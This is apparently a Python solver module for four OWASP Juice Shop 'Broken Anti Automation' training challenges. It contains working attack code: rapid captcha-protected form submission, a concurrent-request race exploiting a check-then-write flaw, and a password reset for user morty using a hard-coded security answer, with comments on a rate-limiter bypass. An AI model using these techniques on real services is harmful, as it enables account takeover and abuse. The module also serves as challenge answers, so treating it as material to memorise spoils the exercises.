"""Broken Anti Automation category solvers (4 of 4). Verified against
routes/verify.ts, routes/likeProductReviews.ts, routes/resetPassword.ts,
data/static/users.yml, and server.ts (fetched 2026-08-09)."""
import concurrent.futures
import uuid

from solvers.base import SolverContext, register

DOMAIN = "juice-sh.op"


# --- routes/verify.ts captchaBypassChallenge (mounted as the last of three
# middlewares on POST /api/Feedbacks, after a real captcha check already
# passed): solved once 10+ successful feedback submissions have happened,
# and the 11th lands within 20 seconds of the 1st — simulating a bot
# submitting many CAPTCHA-protected forms in rapid succession. Each
# submission needs its own fresh captcha (GET /rest/captcha), same as every
# other /api/Feedbacks POST in this project. Firing 11 in a tight loop
# comfortably finishes in well under 20 seconds locally. ---

@register("captchaBypassChallenge", "Broken Anti Automation", 3)
def solve_captcha_bypass(ctx: SolverContext) -> None:
    email = f"captchabypass.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    for _ in range(11):
        captcha = ctx.client.get("/rest/captcha").json()
        ctx.client.post(
            "/api/Feedbacks",
            json={
                "comment": "automation test",
                "rating": 3,
                "captchaId": captcha["captchaId"],
                "captcha": captcha["answer"],
            },
        ).raise_for_status()


# --- routes/verify.ts accessControlChallenges, mounted on /assets/i18n:
# solved by requesting the joke Klingon (tlh_AA) translation file — a
# language file no real user would ever request, hence "extra". ---

@register("extraLanguageChallenge", "Broken Anti Automation", 5)
def solve_extra_language(ctx: SolverContext) -> None:
    ctx.client.get("/assets/i18n/tlh_AA.json").raise_for_status()


# --- routes/likeProductReviews.ts: the "like a review" handler checks
# `likedBy.includes(user.email)` BEFORE an artificial 150ms sleep, then
# only appends the user's email to `likedBy` AFTER that sleep — a classic
# TOCTOU race. Firing several concurrent "like" requests for the same
# review lets more than one slip past the initial check before any of
# their writes land, so the same user's email ends up appended to
# `likedBy` more than twice. Needs a review to exist first (created via
# the same account, then liked by that same account many times at once). ---

@register("timingAttackChallenge", "Broken Anti Automation", 6)
def solve_timing_attack(ctx: SolverContext) -> None:
    email = f"timing.{uuid.uuid4().hex[:8]}@{DOMAIN}"
    ctx.client.register(email, "Test1234!")
    ctx.client.login(email, "Test1234!")
    products = ctx.client.get("/rest/products/search", params={"q": ""}).json()["data"]
    product_id = products[0]["id"]
    ctx.client.put(f"/rest/products/{product_id}/reviews", json={"message": "racing this", "author": email}).raise_for_status()
    reviews = ctx.client.get(f"/rest/products/{product_id}/reviews").json()["data"]
    review_id = next(r["_id"] for r in reviews if r["author"] == email)

    def _like():
        return ctx.client.post("/rest/products/reviews", json={"id": review_id})

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(_like) for _ in range(8)]
        concurrent.futures.wait(futures)


# --- routes/resetPassword.ts verifySecurityAnswerChallenges: the real
# seeded security-question answer for Morty (data/static/users.yml) is
# known directly, so this solves in a single correct request — no need to
# brute-force or to exploit the X-Forwarded-For rate-limiter bypass the
# challenge's name alludes to (that's the *intended* exploit if you don't
# already know the answer; knowing it makes the point moot). ---

@register("resetPasswordMortyChallenge", "Broken Anti Automation", 5)
def solve_reset_password_morty(ctx: SolverContext) -> None:
    ctx.client.post(
        "/rest/user/reset-password",
        json={"email": f"morty@{DOMAIN}", "answer": "5N0wb41L", "new": "NewMortyPassword1!", "repeat": "NewMortyPassword1!"},
    ).raise_for_status()
